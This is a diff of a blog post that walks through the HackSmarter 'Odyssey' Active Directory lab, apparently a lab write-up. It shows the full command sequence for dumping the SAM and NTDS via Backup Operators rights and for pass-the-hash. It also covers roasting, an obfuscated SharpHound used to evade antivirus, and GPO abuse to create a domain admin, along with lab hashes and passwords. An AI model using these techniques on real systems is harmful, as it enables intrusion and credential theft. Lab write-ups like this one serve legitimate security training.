@@ -1,9 +1,11 @@
 ---
 title: "HackSmarter Odyssey Walkthrough  "
-date: 2026-06-09 00:00:00 +0000
+date: 2026-06-08 00:00:00 +0000
 categories: [ HackSmarterlabs]
 tags: [Hacksmarterlabs , Active Directory]
 ---
+
+<img width="2784" height="1504" alt="image" src="https://github.com/user-attachments/assets/0fa82f23-5b66-4fcc-addb-566d2fd71c8b" />
 
 
 ## Objective / Scope
@@ -46,6 +48,24 @@ Enumerating RPC and ldap didn't return anything useful either .
 <img width="1082" height="332" alt="image" src="https://github.com/user-attachments/assets/69e1a6e6-b751-4de0-b4fb-54f271f3252d" />
 
 Tried checking the shares on the other windows workstation but that didn't work either . The way here is definetly through the Web server . 
+
+Before we go deeper : One thing i like to keep in mind when doing an lab that involves AD is this quick checklist :
+
+```bash
+Scan All TCP Ports : Check The useful note Down for more info .
+Check ldap , rpc , smb with anonymous access . Check for Public Shares .
+Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
+Check usernames found with kerbrute .
+Search for ASREP Roastable Users .
+Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
+Try to authenticate using every protocol .
+Enumerate shares with those Users found . Use netexec to download .
+Check Certipy for Vulnerable Templates if there is an ADCS in place .
+If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
+If we can’t privesc , we can move to Blood Hound .
+```
+
+Now let's enumerate each machine separately starting with the web app . 
 
 ### Web-01 !
 
@@ -227,7 +247,6 @@ john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
 
 # DICTIONARY CRACKING NTLM HASHES WITH rockyou.txt
 john --format=NT --wordlist=rockyou.txt hashes.txt
-
 ```
 
 First we import the shadow and the passwd file : 
@@ -257,7 +276,235 @@ Pretty weird , our user has read access over the Admin share and Write over all 
 
 Before we check the Shares, let's RDP into the machine to enumerate it further . 
 
+```bash
+xfreerdp3 /v:EC2AMAZ-NS87CNK /u:ghill_sa /p:'P@ssw0rd!'  /cert:ignore +clipboard /dynamic-resolution 
+```
 
+<img width="1475" height="548" alt="image" src="https://github.com/user-attachments/assets/edbed7d6-231f-4bdf-be6f-852c0f521f4d" />
 
+Checking the Documents , Desktop and all the other folders of the ghill_sa user , we find nothing useful . 
 
+But if we check the shares : 
 
+<img width="1414" height="782" alt="image" src="https://github.com/user-attachments/assets/7be90149-6db9-469c-852b-0bd07c3d8f26" />
+
+We find these Creds , i tried validating them , but they don't seem to be Real users . 
+
+<img width="890" height="738" alt="image" src="https://github.com/user-attachments/assets/e26c5b32-ab3f-4686-b378-f811a4231b72" />
+
+For now let's see if we can elevate our privileges on the machine . 
+
+Before i import Winpeak or Powerup , first let's check the Groups as well as the Tokens , maybe we can get some quick wins . 
+
+<img width="1197" height="758" alt="image" src="https://github.com/user-attachments/assets/b3125cf5-1b72-4d2c-9c1c-db2893e7ae00" />
+
+Perfect , we are part of the Backup Operators group. This is very good news since we can create a backup for the SAM DB and dump hashes that way , I already have a step by step guide on my OSCP methdology : 
+
+```bash
+====> If you want to dump only local users : 
+
+On Windows : 
+
+cd c:\ 
+mkdir temp 
+cd temp
+reg save hklm\sam c:\temp\sam
+reg save hklm\system c:\temp\system 
+copy sam,system \\TSCLIENT\share\ 
+
+On kali :
+
+secretsdump.py -sam sam -system systsem local . 
+
+====> If you want to dump all users on domain (u need ntds file , requires us to be on the DC for this ) . 
+
+On Kali : 
+
+nano viper.dsh : Inside of it type : 
+set context persistent nowriters 
+add volume c: alias viper 
+create 
+expose %viper% x: 
+
+unix2dos viper.dsh 
+
+On Windows : 
+
+upload viper.dsh : We need to import the file onto the machine (use upload on evilwinrm or impacket smbserver or iwr ...) 
+powershell -c iwr -uri http://KaliIP\viper.dsh -o viper.dsh 
+
+diskshadow /s viper.dsh 
+robocopy /b x:\windows\ntds . ntds.dit 
+reg save hklm\system c:\windows\temp\system 
+
+On Kali : 
+
+impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
+
+```
+
+In our case we will be following the first section since this is a normal workstation and not the DC , but if you ever come across a user on the DC that is part of BackupOperator group , you can follow the second part to dump the NTDS file . 
+
+First we open a PS shell (Run it as Administrator) , then copy the sam and System files . 
+
+<img width="761" height="584" alt="image" src="https://github.com/user-attachments/assets/69f48790-e51f-485b-b68f-ebf3ea65613f" />
+
+Now to transfer the files , i already have a Shared drive (from the xfree rdp command). The location is always \\TSCLIENT\sharename\ . In our case the name is Shared : 
+
+```bash
+==> RDP command : 
+xfreerdp3 /v:EC2AMAZ-NS87CNK /u:ghill_sa /p:'P@ssw0rd!'  /cert:ignore +clipboard /dynamic-resolution /drive:.,Shared
+
+==> File Transfer :
+cd c:\temp
+move * \\TSCLIENT\shared
+```
+
+<img width="942" height="679" alt="image" src="https://github.com/user-attachments/assets/bbfa6bbe-385a-4fa9-b76e-000b205364fb" />
+
+Now back to our Kali machine we can use secretsdump to dump the SAM . 
+
+<img width="1483" height="790" alt="image" src="https://github.com/user-attachments/assets/dc232e8e-9ace-4b53-9d1e-57b96d1dbbd3" />
+
+A lot of local users :)
+
+### DC01 :
+
+I tried authenticating with all of them using their hashes to the domain , to see which users are Domain users, that we can use to enumerate the Domain further . 
+
+<img width="1462" height="649" alt="image" src="https://github.com/user-attachments/assets/78a8dda0-2032-47c6-86a5-67e830e1f517" />
+
+Finally we find a Domain User , Now we can generate a list of valid domain users , test for ASREPROASTING , Kerberoasting , password Spraying then if we find nothing we can check Bloodhound ACLs . 
+
+```bash
+nxc smb DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --rid-brute --rid-brute  | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f 2 | tee all_users
+```
+
+<img width="1145" height="276" alt="image" src="https://github.com/user-attachments/assets/12a55782-d7aa-4849-bc05-03ee521d3d09" />
+
+Looking at it , very  few users to have ASREPROASTING , but still let's test it . 
+
+```bash
+==> Asreproasting:
+impacket-GetNPUsers  hsm.local/ -dc-ip DC01.hsm.local -usersfile all_users -outputfile Hashes.txt
+
+==> Kerberoasting :
+nxc ldap DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --kerberoasting kerb_hash
+```
+
+<img width="1388" height="546" alt="image" src="https://github.com/user-attachments/assets/1cacb821-190d-49bf-a6fd-5d5e39bcfcca" />
+
+Nothing useful , let's try and run BloodHound , maybe we can find Important ACLs for the compromised user that we can abuse , here are the steps to setup Bloodhound :
+
+```bash
+# To get the ZIP file :
+nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
+# To run BloodHound : 
+https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
+wget https://github.com/SpecterOps/bloodhoun  d-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
+tar -xvzf bloodhound-cli-linux-amd64.tar.gz
+sudo ./bloodhound-cli install
+./bloodhound-cli resetpwd
+Visit : http://localhost:8080/ui/login 
+```
+
+Unfortunately this didn't work : 
+
+<img width="1659" height="380" alt="image" src="https://github.com/user-attachments/assets/2188e8a9-6a84-4b2b-b1e6-e091ac854b36" />
+
+This is normal since they mentionned it in the Objective section .
+
+Now i did import Sharphound to the machine via our shared drive but due to the machine having an AV , it automatically blocks Sharphound . 
+
+Apparently there is this obfuscated version of Sharphound that we can use to try and bypass the AV . 
+
+```bash
+https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/SharpHound.exe._obf.exe
+```
+
+We easily import it using our Shared drive . 
+
+<img width="1597" height="463" alt="image" src="https://github.com/user-attachments/assets/1a71ae2c-5c3d-40b4-8d50-7091266a1e9d" />
+
+Again this didn't work since it can't resolve the DC DNS name -_- , so the only way will be to run sharphound right on the DC machine haha . let's see if our user can access the DC via WINRM or rdp  . 
+
+<img width="1515" height="261" alt="image" src="https://github.com/user-attachments/assets/317e0735-53c9-410e-a261-d47adb1eaa4f" />
+
+This is perfect , our user can Winrm to the DC01 , let's login via evil-winrm then import our Sharphound exe via evil-winrm and run it . 
+
+<img width="1129" height="769" alt="image" src="https://github.com/user-attachments/assets/5241334f-4005-4e74-abcd-1aad8fa10bcc" />
+
+Now we just run it and Download it via evil-wirm : 
+
+<img width="1468" height="637" alt="image" src="https://github.com/user-attachments/assets/4d4bb81f-1786-4ec4-abef-add7fcd3b633" />
+
+Finally we inject this zip file into Bloodhound . 
+
+<img width="1596" height="676" alt="image" src="https://github.com/user-attachments/assets/7f9c5f71-4af6-4fd6-b10a-b608527c0966" />
+
+We can see that our user has GenericWrite over a GPO — this is a critical security misconfiguration, as it can be abused to create a scheduled task that adds a new user to the Domain Admins group. Once the GPO applies, we can use the newly created account to perform a DCSync attack and dump all domain credentials.
+
+To do this we can use a tool like GPOabuse which will automate this for us , by default the tool will create this user john user to local administrators group (Password: H4x00r123..)
+
+All we need are Valid Creds for the user who has generic write and the GPO ID , which can be found via Blooodhound or in the SYSVOL share . 
+
+<img width="1257" height="593" alt="image" src="https://github.com/user-attachments/assets/5d573ed5-ccab-498b-a0d7-6a0586474710" />
+
+```bash
+git clone https://github.com/Hackndo/pyGPOAbuse
+cd pyGPOAbuse
+==> To run it 
+python3 pygpoabuse.py 'hsm.local'/'bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -f
+```
+
+<img width="1789" height="589" alt="image" src="https://github.com/user-attachments/assets/82be9a5b-a964-43a1-83af-d4421855c422" />
+
+Now either we wait for it to execute or we can force a GPO refresh using our winrm shell so that it executes immediately : 
+
+<img width="1086" height="754" alt="image" src="https://github.com/user-attachments/assets/2b679aea-e7c3-4586-ab62-0efe9e8c7a82" />
+
+Now we use our new user to dump the ntds file and get all Hashes . 
+
+<img width="1567" height="398" alt="image" src="https://github.com/user-attachments/assets/5b7762fa-46b5-4500-971a-348e5cec256d" />
+
+Now for the flags :
+
+The First user flag can be found in the Root directory on machine WEB01 . 
+
+<img width="1026" height="530" alt="image" src="https://github.com/user-attachments/assets/a5323cb8-b9fb-4bea-92d3-483fe57c21b7" />
+
+The Second user flag is in the Administrator Desktop of EC2AMAZ-NS87CNK : We can connect via PSexec since we already have the Hash of the Administrator via SAM dump . 
+
+I tried PSexec , SMBsexec , wmi2exec , but they all didn't work -_- , finally i used a tool called atexec which creates a task for each command : 
+
+```bash
+==> These 2 Worked but broke immediately after 1 command :
+
+smbexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
+psexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
+
+==> These 2 didn't even work .
+
+python3 wmiexec2.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
+wmiexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36
+
+==> Again Worked once but broke immediately : 
+atexec.py administrator@EC2AMAZ-NS87CNK.hsm.local -hashes :d5cad8a9782b2879bf316f56936f1e36 "whoami"
+```
+
+Finally i gave up and used smbclient to be able to read the C$ Share and get the root that way -_- :
+
+```bash
+smbclient.py -hashes :d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.26.225
+```
+<img width="1304" height="747" alt="image" src="https://github.com/user-attachments/assets/65b365f7-d49f-4465-97bf-88134d2e5b33" />
+
+From there we find the second flag in the Administrator's Desktop :
+
+<img width="1143" height="536" alt="image" src="https://github.com/user-attachments/assets/93d845bd-b049-4fc3-b0fa-105050a7c5ff" />
+
+And for the Last flag , it's in the Administrator Desktop . 
+
+<img width="1042" height="461" alt="image" src="https://github.com/user-attachments/assets/feaeaf9e-ef1e-48f6-81e8-529eb2721456" />
+
+That was all for this lab , Hope you learned something from it . See you in the next one :) 
